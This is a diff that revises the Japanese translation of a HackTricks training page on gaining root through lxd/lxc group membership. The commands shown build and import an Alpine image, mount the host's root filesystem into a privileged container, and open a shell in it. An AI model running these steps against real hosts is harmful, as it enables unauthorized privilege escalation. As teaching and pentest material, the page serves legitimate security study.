@@ -1,18 +1,18 @@
-# lxd/lxc Group - Privilege escalation
+# lxd/lxc Group - 権限昇格
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 _**lxd**_ **または** _**lxc**_ **group** に所属している場合、root になることができます
 
-## インターネットを使用しない Exploiting
+## internet なしでの Exploiting
 
 ### Method 1
 
-信頼できる repository から、lxd で使用する alpine image を download できます。  
-Canonical は site で daily build を公開しています: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-最新の build から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください。（Directory name は日付です）。
+lxd で使用する alpine image を trusted repository から download できます。
+Canonical は site で daily build を公開しています：[https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+最新の build から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください。（directory 名は date です）。
 
-または、次の distro builder を machine に install できます: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（github の instructions に従ってください）：
+または、machine にこの distro builder を install できます：[https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（github の instructions に従ってください）：
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-**incus.tar.xz**（Canonical repositoryからdownloadした場合は**lxd.tar.xz**）と**rootfs.squashfs**をUploadし、imageをrepoに追加してcontainerを作成します：
+**incus.tar.xz**（Canonical repository からダウンロードした場合は **lxd.tar.xz**）と **rootfs.squashfs** を upload し、image を repo に追加して container を作成します：
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,10 +51,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> このエラー _**Error: No storage pool found. Please create a new storage pool**_\
-> **`lxd init`** を実行し、すべてのオプションでデフォルトを設定します。その後、前のコマンド群を**もう一度実行**します。
+> このエラー _**Error: No storage pool found. Please create a new storage pool**_ が表示された場合\
+> **`lxd init`** を実行し、すべてのオプションをデフォルトのまま設定してください。その後、前のコマンド群を**再実行**します
 
-最後に、containerを実行してrootを取得できます：
+最後に、container を実行して root を取得できます:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -62,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### 方法 2
 
-Alpine imageを buildし、`security.privileged=true` flagを使用して起動することで、containerがhost filesystemとrootとしてやり取りするよう強制します。
+Alpine image を build し、flag `security.privileged=true` を使用して起動することで、container が host filesystem と root として対話するよう強制します。
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
